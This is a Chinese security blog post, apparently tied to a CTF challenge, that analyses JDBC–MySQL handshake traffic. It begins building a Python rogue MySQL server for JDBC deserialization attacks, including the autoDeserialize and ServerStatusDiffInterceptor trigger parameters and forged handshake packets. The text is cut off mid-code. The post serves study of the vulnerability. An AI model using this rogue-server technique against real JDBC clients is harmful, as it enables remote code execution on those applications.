<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>超详细的一步步搭建用于JDBC反序列化的恶意Mysql服务 | Lanb0's blog|一个默默无闻的网安爱好者</title><meta name="author" content="lanb0"><meta name="copyright" content="lanb0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="这一篇文章主要是对上一篇 从一道题来看JDBC反序列化([羊城杯 2020]A Piece Of Java) 的补充(强烈建议先看上一篇)，因为在那篇文章我们只分析和复现了JDBC反序列化漏洞的利用，而为了摆脱脚本小子的debuff，我们肯定也需要自己来写构建恶意MYSQL服务的脚本 感谢其他师傅写的相关的文章，本篇文章也可以当做是对其他师傅对于JDBC反序列化漏洞相关文章的一些补充，作者会尽可能">
<meta property="og:type" content="article">
<meta property="og:title" content="超详细的一步步搭建用于JDBC反序列化的恶意Mysql服务">
<meta property="og:url" content="https://wustzhb.github.io/2023/04/18/2023-04-18-JDBC%E2%99%A5MYSQL%E4%B9%8B%E9%97%B4%E4%B8%8D%E5%BE%97%E4%B8%8D%E8%AF%B4%E7%9A%84%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="Lanb0&#39;s blog|一个默默无闻的网安爱好者">
<meta property="og:description" content="这一篇文章主要是对上一篇 从一道题来看JDBC反序列化([羊城杯 2020]A Piece Of Java) 的补充(强烈建议先看上一篇)，因为在那篇文章我们只分析和复现了JDBC反序列化漏洞的利用，而为了摆脱脚本小子的debuff，我们肯定也需要自己来写构建恶意MYSQL服务的脚本 感谢其他师傅写的相关的文章，本篇文章也可以当做是对其他师傅对于JDBC反序列化漏洞相关文章的一些补充，作者会尽可能">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://wustzhb.github.io/img/head.jpg">
<meta property="article:published_time" content="2023-04-18T07:36:00.000Z">
<meta property="article:modified_time" content="2023-04-29T03:30:44.885Z">
<meta property="article:author" content="lanb0">
<meta property="article:tag" content="网络安全">
<meta property="article:tag" content="反序列化">
<meta property="article:tag" content="JDBC">
<meta property="article:tag" content="MYSQL">
<meta property="article:tag" content="Wireshark">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wustzhb.github.io/img/head.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://wustzhb.github.io/2023/04/18/2023-04-18-JDBC%E2%99%A5MYSQL%E4%B9%8B%E9%97%B4%E4%B8%8D%E5%BE%97%E4%B8%8D%E8%AF%B4%E7%9A%84%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '超详细的一步步搭建用于JDBC反序列化的恶意Mysql服务',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-04-29 11:30:44'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于博主</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/index_img.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Lanb0's blog|一个默默无闻的网安爱好者"><span class="site-name">Lanb0's blog|一个默默无闻的网安爱好者</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于博主</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">超详细的一步步搭建用于JDBC反序列化的恶意Mysql服务</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-18T07:36:00.000Z" title="发表于 2023-04-18 15:36:00">2023-04-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-29T03:30:44.885Z" title="更新于 2023-04-29 11:30:44">2023-04-29</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>这一篇文章主要是对上一篇 <a href="https://wustzhb.github.io/2023/04/18/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E6%9D%A5%E7%9C%8BJDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020%5DA-Piece-Of-Java)/">从一道题来看JDBC反序列化([羊城杯 2020]A Piece Of Java)</a> 的补充(强烈建议先看上一篇)，因为在那篇文章我们只分析和复现了JDBC反序列化漏洞的利用，而为了摆脱脚本小子的<strong>debuff</strong>，我们肯定也需要自己来写构建恶意MYSQL服务的脚本</p>
<p><strong>感谢其他师傅写的相关的文章，本篇文章也可以当做是对其他师傅对于JDBC反序列化漏洞相关文章的一些补充，作者会尽可能详细地写出坑点和非大牛的师傅不太理解,却是大牛师傅们跳过的一些细节</strong></p>
<blockquote>
<p>JDBC（Java Database Connectivity）是Java语言中用于连接和操作数据库的一种标准API。它允许Java程序与多种关系型数据库建立连接，实现数据的查询、插入、更新和删除等操作。</p>
</blockquote>
<h2 id="先回顾一下JDBC和MYSQL的通信过程"><a href="#先回顾一下JDBC和MYSQL的通信过程" class="headerlink" title="先回顾一下JDBC和MYSQL的通信过程:"></a>先回顾一下JDBC和MYSQL的通信过程:</h2><ol>
<li><p>加载驱动：首先，需要加载JDBC驱动程序。在Java中，可以使用<code>Class.forName()</code>方法加载驱动类。对于MySQL，驱动类通常是<code>com.mysql.cj.jdbc.Driver</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br></pre></td></tr></table></figure>


</li>
<li><p>创建连接：接下来，需要创建一个与MySQL数据库服务器的连接。可以使用<code>DriverManager.getConnection()</code>方法创建一个连接。你需要提供数据库的URL、用户名和密码。URL通常包含以下信息：</p>
<p>​	协议：对于MySQL，协议是<code>jdbc:mysql</code></p>
<p>​	主机名：数据库服务器的地址，如<code>localhost</code>或具体的IP地址</p>
<p>​	端口号：MySQL服务器监听的端口，默认是3306</p>
<p>​	数据库名：要连接的数据库名称</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/testdb&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> <span class="string">&quot;username&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;password&quot;</span>;</span><br><span class="line"><span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url, user, password);</span><br></pre></td></tr></table></figure>


</li>
<li><p>创建语句：连接成功后，可以创建一个<code>Statement</code>或<code>PreparedStatement</code>对象来执行SQL语句。<code>Statement</code>对象用于执行静态SQL语句，而<code>PreparedStatement</code>对象用于执行预编译的SQL语句，提高性能。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement();</span><br></pre></td></tr></table></figure>
</li>
<li><p>执行查询：使用<code>Statement</code>对象的<code>executeQuery()</code>方法执行查询操作，如SELECT语句。这将返回一个<code>ResultSet</code>对象，表示查询结果。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(<span class="string">&quot;SELECT * FROM tablename&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ol>
<p> 5.处理结果：通过<code>ResultSet</code>对象，可以获取查询结果。<code>ResultSet</code>对象提供了一系列方法，如       <code>next()</code>、<code>getInt()</code>、<code>getString()</code>等，用于处理查询结果。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (resultSet.next()) &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> resultSet.getInt(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> resultSet.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;ID: &quot;</span> + id + <span class="string">&quot;, Name: &quot;</span> + name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>6.关闭资源：在完成操作后，需要关闭<code>ResultSet</code>、<code>Statement</code>和<code>Connection</code>对象，以释放资源。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">resultSet.close();</span><br><span class="line">statement.close();</span><br><span class="line">connection.close();</span><br></pre></td></tr></table></figure>

<p><strong>我们在这篇文章中只关注加载驱动和创建连接的过程</strong></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建:"></a>环境搭建:</h2><p>本地创建一个JDBC客户端:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDBC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jdbc_url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/test?characterEncoding=UTF-8&amp;serverTimezone=Asia/Shanghai&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&amp;autoDeserialize=true&amp;useSSL=false&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;&quot;</span>;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> DriverManager.getConnection(jdbc_url, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>开启mysql服务,然后用JDBC客户端连接，别忘了还要打开Wireshark(<strong>建议使用最新版，否则可能无法识别mysql协议流量</strong>)，因为我们的mysql服务和JDBC都在本机中，所以捕获选择Adapter for loopback traffic capture,这个过滤器专门捕获localhost和127.0.0.1这样的环回流量，其他网口是捕获不到的</p>
<img src="https://lanb0-1305167197.cos.ap-nanjing.myqcloud.com/20230419_3.png" style="zoom:50%;" />

<p>等待JDBC连接成功后，返回的结果如下:</p>
<p><img src="https://lanb0-1305167197.cos.ap-nanjing.myqcloud.com/20230419_4.png"></p>
<p>这些信息是加了queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor拦截器之后才会出现的，</p>
<p>这是一个包含各种状态数据的信息对象，这些数据在某些场景下可能有用，例如监控和诊断数据库性能。下面是这些状态数据的简要解释：</p>
<ul>
<li>Bytes_received：服务器收到的字节数</li>
<li>Queries：执行的查询数量</li>
<li>Com_show_status：执行的SHOW STATUS命令的数量</li>
<li>Questions：服务器收到的请求数量</li>
<li>Com_set_option：执行的SET OPTION命令的数量</li>
<li>Table_locks_immediate：立即获得的表锁的数量</li>
<li>Bytes_sent：服务器发送的字节数</li>
</ul>
<p><strong>其中，SHOW STATUS语句是ServerStatusDiffInterceptor拦截器的preProcess方法在与mysql建立连接时自动执行的语句(这里不太清楚的可以看开头提起的上一篇文章)</strong></p>
<blockquote>
<p>Com_set_option：执行的SET OPTION命令的数量</p>
</blockquote>
<p>一些关于配置相关的参数都称之为SET OPTION命令，这里有一条我们设置了时区<strong>serverTimezone&#x3D;Asia&#x2F;Shanghai</strong>，必须要指定时区，否则数据库和系统时区不一样会报错(高版本mysql默认时区是美国，而中国和美国有8小时的时差)</p>
<h3 id="这里有大坑，注意！"><a href="#这里有大坑，注意！" class="headerlink" title="这里有大坑，注意！"></a>这里有大坑，注意！</h3><p>JDBC的url中一定要加一个参数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useSSL=<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>我们先来看<strong>不加</strong>这一个参数的wireshark流量:</p>
<p><img src="https://lanb0-1305167197.cos.ap-nanjing.myqcloud.com/20230419_5.png"></p>
<blockquote>
<p>是不是感觉少了点什么？</p>
</blockquote>
<p>如果我们<strong>加上</strong>这个参数，wireshark的流量则是:</p>
<p><img src="https://lanb0-1305167197.cos.ap-nanjing.myqcloud.com/20230419_6.png"></p>
<p>作者在这里简单解释一下:</p>
<p>Mysql在<strong>默认</strong>的情况下,为保证安全,与外界的通信会默认使用<strong>SSL&#x2F;TLS</strong>传输协议来代替<strong>MySQL原本</strong>的通信协议，所以如果不加useSSL&#x3D;false,那么除了Greeting包，其他所有的数据包都会通过SSL&#x2F;TLS协议(Wireshark中显示的是<strong>TLS</strong>)来进行加密传递，因为Greeting包只起到一个打招呼的作用，包中没有敏感信息，所以mysql并没有对其也使用SSL(毕竟加密传输也会降低效率),Login包在这里是一个发起建立连接的<strong>不完整</strong>的请求包,作者猜测其中的user,db,password等信息已经<strong>单独</strong>使用TLS协议来传输了</p>
<blockquote>
<p>师傅们可以用<strong>tcp.port&#x3D;&#x3D;3306</strong>来捕获mysql的所有流量，可以发现</p>
</blockquote>
<ul>
<li>当<strong>没有</strong>使用useSSL&#x3D;false时，wireshark的捕获器包含了TLS,mysql,tcp协议的流量</li>
<li>当使用了useSSL&#x3D;false时，wireshark的捕获器只包含了mysql,tcp协议的流量</li>
</ul>
<p>由此可以佐证作者的猜想</p>
<p><strong>因为这篇文章的目的是学习jdbc和mysql的通信过程从而自己搭建一个恶意mysql服务，所以我们需要获取完整且明确的通信流量,因此，我们需要使用useSSL&#x3D;false</strong></p>
<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><blockquote>
<p>建议大家先捕获JDBC与本地官方的mysql流量，方便观察数据包结构</p>
</blockquote>
<h3 id="Info-Server-Greeting-proto-x3D-10-version-x3D-8-0-12"><a href="#Info-Server-Greeting-proto-x3D-10-version-x3D-8-0-12" class="headerlink" title="Info:Server Greeting proto&#x3D;10 version&#x3D;8.0.12"></a>Info:Server Greeting proto&#x3D;10 version&#x3D;8.0.12</h3><blockquote>
<p>当JDBC客户端与MySQL服务器三次握手建立TCP连接后(解释了为什么明明是JDBC向mysql发起请求但却是mysql给jdbc率先发消息)，MySQL服务器会发送一个服务器问候消息（Server Greeting）给客户端。这个消息包含了服务器的相关信息</p>
</blockquote>
<p>其中proto&#x3D;10代表协议版本号，version&#x3D;8.0.12代表服务器的MySQL版本号</p>
<p><strong>消息中具体的内容新版wireshark已经帮我们整理出来了,给官方赞一个</strong></p>
<p><img src="https://lanb0-1305167197.cos.ap-nanjing.myqcloud.com/20230420_1.png"></p>
<p>先来分析下mysql协议的整体结构</p>
<p>mysql协议包本质上还是TCP协议，只不过是TCP的负载部分(payload)中存储了mysql通信数据，这一点是作者通过下面这张图分析出来的，在字节<strong>4a 00 00 00</strong>之前都是TCP协议头的内容，这一点也可以通过点击左边Tcp payload后，wireshark给我们自动选定了Mysql协议的字节内容看出</p>
<p><img src="https://lanb0-1305167197.cos.ap-nanjing.myqcloud.com/20230420_2.png"></p>
<p><strong>观察右边的内容，greeting包中主要内容是:使用的认证插件:mysql_native_password，用来加密pwd的盐值salt</strong></p>
<p><strong>unused:00000000000000000000的部分是填充位（padding）。这些填充位是为了保持数据包结构的一致性以及可能的对齐目的而设置的。没有实际意义</strong></p>
<blockquote>
<p>其他细节部分师傅们感兴趣的话可以自己细看，这里就不赘述了</p>
</blockquote>
<p>由于我们是用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br></pre></td></tr></table></figure>

<p>来建立与JDBC的通信的，而socket会自动帮我们构建好<strong>TCP头</strong>的内容(source ip,port,校验等),所以我们<strong>只需要发送伪造的mysql部分的流量数据</strong>就行</p>
<p>到目前为止我们可以编写一部分恶意mysql的python代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#先导入所有需要的库，后面就不import了</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#设定greeting包的伪造数据</span></span><br><span class="line">greeting_data=<span class="string">&#x27;4a0000000a382e302e313200170000000a170d656e32064600ffffc00200ffc31500000000000000000000605a28686d63690805351259006d7973716c5f6e61746976655f70617373776f726400&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">conn,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;向目标JDBC发送数据 : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="comment">#程序入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#设置端口</span></span><br><span class="line">    host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    port=<span class="number">3309</span></span><br><span class="line">    <span class="comment">#开启一个socket接受JDBC的连接</span></span><br><span class="line">    sql_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#一旦断开连接就立马重置端口，这样不用每次等待一段时间才能重新使用该端口</span></span><br><span class="line">    sql_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    <span class="comment">#绑定ip</span></span><br><span class="line">    sql_server.bind((host, port))</span><br><span class="line">    <span class="comment">#将socket设置为被动监听模式，并且一次只能接受一个连接</span></span><br><span class="line">    sql_server.listen(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;恶意mysql已在<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>开启&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        //conn为连接句柄,addr为接受请求的源地址</span><br><span class="line">        conn, addr = sql_server.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;接受到来自&#123;&#125;:&#123;&#125;的连接请求&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line">        <span class="comment">#发送greeting包</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line">        .....</span><br></pre></td></tr></table></figure>



<h3 id="Info-Login-Request-user-x3D-root-db-x3D-test"><a href="#Info-Login-Request-user-x3D-root-db-x3D-test" class="headerlink" title="Info:Login Request user&#x3D;root db&#x3D;test"></a>Info:Login Request user&#x3D;root db&#x3D;test</h3><p>这个包是当JDBC在收到greeting打招呼之后,发送的登录请求，里面有规定的字符集，user,pwd的哈希值，连接的数据库等信息</p>
<h3 id="Info-Response-OK"><a href="#Info-Response-OK" class="headerlink" title="Info: Response  OK"></a>Info: Response  OK</h3><p>如果认证成功，mysql会发送一个Response Code:0x00表示认证成功</p>
<p><img src="https://lanb0-1305167197.cos.ap-nanjing.myqcloud.com/20230420_3.png"></p>
<p>还是一样的，把Mysql的部分copy并且更新我们的代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#先导入所有需要的库，后面就不import了</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#greeting包的伪造数据</span></span><br><span class="line">greeting_data=<span class="string">&#x27;4a0000000a382e302e313200170000000a170d656e32064600ffffc00200ffc31500000000000000000000605a28686d63690805351259006d7973716c5f6e61746976655f70617373776f726400&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Response Ok包的伪造数据</span></span><br><span class="line">response_ok_data=<span class="string">&#x27;0700000200000002000000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span 